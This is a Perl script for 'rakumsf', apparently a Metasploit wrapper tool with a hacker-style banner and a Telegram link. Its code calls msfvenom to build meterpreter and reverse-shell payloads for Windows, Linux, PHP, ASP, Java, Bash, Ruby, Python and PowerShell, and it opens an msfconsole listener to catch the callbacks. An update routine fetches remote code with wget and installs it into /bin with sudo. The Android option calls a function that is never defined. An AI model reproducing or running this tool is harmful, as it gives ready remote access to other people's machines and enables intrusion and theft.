use strict;
use warnings;
use IO::File;
use Getopt::Long;
use Term::ANSIColor;

my $datetime    = localtime;

if ($^O =~ /MSWin32/) {system("cls"); }else { system("clear"); }
print color('bold green');
print q(

     ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡠⢤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠟⠃⠀⠀⠙⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠋⠀⠀⠀⠀⠀⠀⠘⣆⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠾⢛⠒⠀⠀⠀⠀⠀⠀⠀⢸⡆⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣶⣄⡈⠓⢄⠠⡀⠀⠀⠀⣄⣷⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣷⠀⠈⠱⡄⠑⣌⠆⠀⠀⡜⢻⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡿⠳⡆⠐⢿⣆⠈⢿⠀⠀⡇⠘⡆⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣷⡇⠀⠀⠈⢆⠈⠆⢸⠀⠀⢣⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣧⠀⠀⠈⢂⠀⡇⠀⠀⢨⠓⣄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣦⣤⠖⡏⡸⠀⣀⡴⠋⠀⠈⠢⡀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⠁⣹⣿⣿⣿⣷⣾⠽⠖⠊⢹⣀⠄⠀⠀⠀⠈⢣⡀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡟⣇⣰⢫⢻⢉⠉⠀⣿⡆⠀⠀⡸⡏⠀⠀⠀⠀⠀⠀⢇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢨⡇⡇⠈⢸⢸⢸⠀⠀⡇⡇⠀⠀⠁⠻⡄⡠⠂⠀⠀⠀⠘
⢤⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠛⠓⡇⠀⠸⡆⢸⠀⢠⣿⠀⠀⠀⠀⣰⣿⣵⡆⠀⠀⠀⠀
⠈⢻⣷⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡿⣦⣀⡇⠀⢧⡇⠀⠀⢺⡟⠀⠀⠀⢰⠉⣰⠟⠊⣠⠂⠀⡸
⠀⠀⢻⣿⣿⣷⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⢧⡙⠺⠿⡇⠀⠘⠇⠀⠀⢸⣧⠀⠀⢠⠃⣾⣌⠉⠩⠭⠍⣉⡇
⠀⠀⠀⠻⣿⣿⣿⣿⣿⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣞⣋⠀⠈⠀⡳⣧⠀⠀⠀⠀⠀⢸⡏⠀⠀⡞⢰⠉⠉⠉⠉⠉⠓⢻⠃
⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣷⡄⠀⠀⢀⣀⠠⠤⣤⣤⠤⠞⠓⢠⠈⡆⠀⢣⣸⣾⠆⠀⠀⠀⠀⠀⢀⣀⡼⠁⡿⠈⣉⣉⣒⡒⠢⡼⠀
⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣎⣽⣶⣤⡶⢋⣤⠃⣠⡦⢀⡼⢦⣾⡤⠚⣟⣁⣀⣀⣀⣀⠀⣀⣈⣀⣠⣾⣅⠀⠑⠂⠤⠌⣩⡇⠀
⠀⠀⠀⠀⠀⠀⠘⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡁⣺⢁⣞⣉⡴⠟⡀⠀⠀⠀⠁⠸⡅⠀⠈⢷⠈⠏⠙⠀⢹⡛⠀⢉⠀⠀⠀⣀⣀⣼⡇⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣽⣿⡟⢡⠖⣡⡴⠂⣀⣀⣀⣰⣁⣀⣀⣸⠀⠀⠀⠀⠈⠁⠀⠀⠈⠀⣠⠜⠋⣠⠁⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⡟⢿⣿⣿⣷⡟⢋⣥⣖⣉⠀⠈⢁⡀⠤⠚⠿⣷⡦⢀⣠⣀⠢⣄⣀⡠⠔⠋⠁⠀⣼⠃⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⡄⠈⠻⣿⣿⢿⣛⣩⠤⠒⠉⠁⠀⠀⠀⠀⠀⠉⠒⢤⡀⠉⠁⠀⠀⠀⠀⠀⢀⡿⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢿⣤⣤⠴⠟⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠑⠤⠀⠀⠀⠀⠀⢩⠇⠀⠀⠀
⠀

       =[ msfraku v1.3-dev                                ]
+ -- --=[ 7 exploits - 1205 auxiliary - 412 post          ]
+ -- --=[ 11 payloads - 46 encoders - 11 nops             ]
+ -- --=[ 9 evasion                                       ]

rakumsf tip: rakumsf can be configured at startup, see 
rakumsf --help to learn more
raku Documentation: https://t.me/rakucyber

⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀   ⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
);



my $host;
my $port;
my $payload_type;

if (@ARGV && $ARGV[0] eq 'update') {
    update_script();
    exit;
}

GetOptions(
    'host=s'   => \$host,
    'port=i'   => \$port,
    'apk'      => sub { $payload_type = 'android' },
    'exe'      => sub { $payload_type = 'windows' },
    'mac'      => sub { $payload_type = 'macos' },
    'linux'    => sub { $payload_type = 'linux' },
    'php'      => sub { $payload_type = 'php' },
    'asp'      => sub { $payload_type = 'asp' },
    'perl'     => sub { $payload_type = 'perl' },
    'python'   => sub { $payload_type = 'python' },
    'jar'      => sub { $payload_type = 'jar' },
    'bash'     => sub { $payload_type = 'bash' },
    'ruby'     => sub { $payload_type = 'ruby' },
    'powershell' => sub { $payload_type = 'powershell' }
) or die "Usage: perl rakumsf.pl --host <HOST> --port <PORT> --type payload\\n";

unless ($host && $port && $payload_type)  {
    die "Usage: perl rakumsf.pl --host <HOST> --port <PORT> --type payload\n";
}
if ($payload_type eq 'windows') {
    generate_payload_windows();
} elsif ($payload_type eq 'macos') {
    generate_payload_macos();
} elsif ($payload_type eq 'android') {
    generate_payload_android();
} elsif ($payload_type eq 'linux') {
    generate_payload_linux();
} elsif ($payload_type eq 'php') {
    generate_payload_php();
} elsif ($payload_type eq 'asp') {
    generate_payload_asp();
} elsif ($payload_type eq 'perl') {
    generate_payload_perl();
} elsif ($payload_type eq 'python') {
    generate_payload_python();
} elsif ($payload_type eq 'jar') {
    generate_payload_jar();
} elsif ($payload_type eq 'bash') {
    generate_payload_bash();
} elsif ($payload_type eq 'ruby') {
    generate_payload_ruby();
} elsif ($payload_type eq 'powershell') {
    generate_payload_powershell();
} else {
    die "Invalid payload type. Use --apk/--exe/--mac/--linux/--php/--asp/--perl/--python/--jar/--bash/--ruby/--powershell\n";
}

sub generate_payload_windows {
    my $output_file = "rakumsf.exe";
    my $payload = "windows/meterpreter/reverse_tcp";
    my $options = "LHOST=$host LPORT=$port";
    my $command = "msfvenom -p $payload $options -f exe > $output_file";
    system($command);

    print "Windows payload generated: $output_file\n";
    system("msfconsole -qx 'use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST $host;set LPORT $port;run'");

}


sub generate_payload_linux {
    my $output_file = "rakumsf.elf";
    my $payload = "linux/x86/meterpreter/reverse_tcp";
    my $options = "LHOST=$host LPORT=$port";
    my $command = "msfvenom -p $payload $options -f elf > $output_file";
    system($command);

    print "Linux payload generated: $output_file\n";
    system("msfconsole -qx 'use exploit/multi/handler;set payload linux/x86/meterpreter/reverse_tcp;set LHOST $host;set LPORT $port;run'");

}

sub generate_payload_php {
    my $output_file = "rakumsf.php";
    my $payload = "php/meterpreter_reverse_tcp";
    my $options = "LHOST=$host LPORT=$port";
    my $command = "msfvenom -p $payload $options -f raw > $output_file";
    system($command);
    print "PHP payload generated: $output_file\n";
    system("msfconsole -qx 'use exploit/multi/handler;set payload php/meterpreter_reverse_tcp;set LHOST $host;set LPORT $port;run'");
}

sub generate_payload_asp {
    my $output_file = "rakumsf.asp";
    my $payload = "asp/meterpreter/reverse_tcp";
    my $options = "LHOST=$host LPORT=$port";
    my $command = "msfvenom -p $payload $options -f asp > $output_file";
    system($command);
    print "ASP payload generated: $output_file\n";
   system("msfconsole -qx 'use exploit/multi/handler;set payload asp/meterpreter_reverse_tcp;set LHOST $host;set LPORT $port;run'");

}

sub generate_payload_perl {
    my $output_file = "rakumsf.pl";
    my $payload = "cmd/unix/reverse_perl";
    my $options = "LHOST=$host LPORT=$port";
    my $command = "msfvenom -p $payload $options -f raw > $output_file";
    system($command);
    print "Perl payload generated: $output_file\n";
    system("msfconsole -qx 'use exploit/multi/handler;set payload cmd/unix/reverse_perl;set LHOST $host;set LPORT $port;run'");

}

sub generate_payload_python {
    my $output_file = "rakumsf.py";
    my $payload = "cmd/unix/reverse_python";
    my $options = "LHOST=$host LPORT=$port";
    my $command = "msfvenom -p $payload $options -f raw > $output_file";
    system($command);
    print "Python payload generated: $output_file\n";
    
}

sub generate_payload_jar {
    my $output_file = "rakumsf.jar";
    my $payload = "java/jsp_shell_reverse_tcp";
    my $options = "LHOST=$host LPORT=$port";
    my $command = "msfvenom -p $payload $options -o $output_file";
    system($command);
    print "JAR payload generated: $output_file\n";
}

sub generate_payload_bash {
    my $output_file = "rakumsf.sh";
    my $payload = "cmd/unix/reverse_bash";
    my $options = "LHOST=$host LPORT=$port";
    my $command = "msfvenom -p $payload $options -f raw > $output_file";
    system($command);
    print "Bash payload generated: $output_file\n";
}

sub generate_payload_ruby {
    my $output_file = "rakumsf.rb";
    my $payload = "cmd/unix/reverse_ruby";
    my $options = "LHOST=$host LPORT=$port";
    my $command = "msfvenom -p $payload $options -f raw > $output_file";
    system($command);
    print "Ruby payload generated: $output_file\n";
}

sub generate_payload_powershell {
        my $output_file = "rakumsf.ps1";
    my $payload = "windows/meterpreter/reverse_tcp";
    my $options = "LHOST=$host LPORT=$port";
    my $command = "msfvenom -p $payload $options -f psh > $output_file";
    system($command);
    print "PowerShell payload generated: $output_file\n";
}
sub update_script{
system("sudo apt install libpar-packer-perl");
system("rm -fr rakumsf.p*");
system("sudo rm -fr /bin/rakumsf");
system("wget https://raw.githubusercontent.com/RakuCyber/rakumsf/main/rakumsf.pm");
system("rm -fr rakumsf");
system("pp -o rakumsf rakumsf.pm");
system("sudo mv rakumsf /bin/");
}
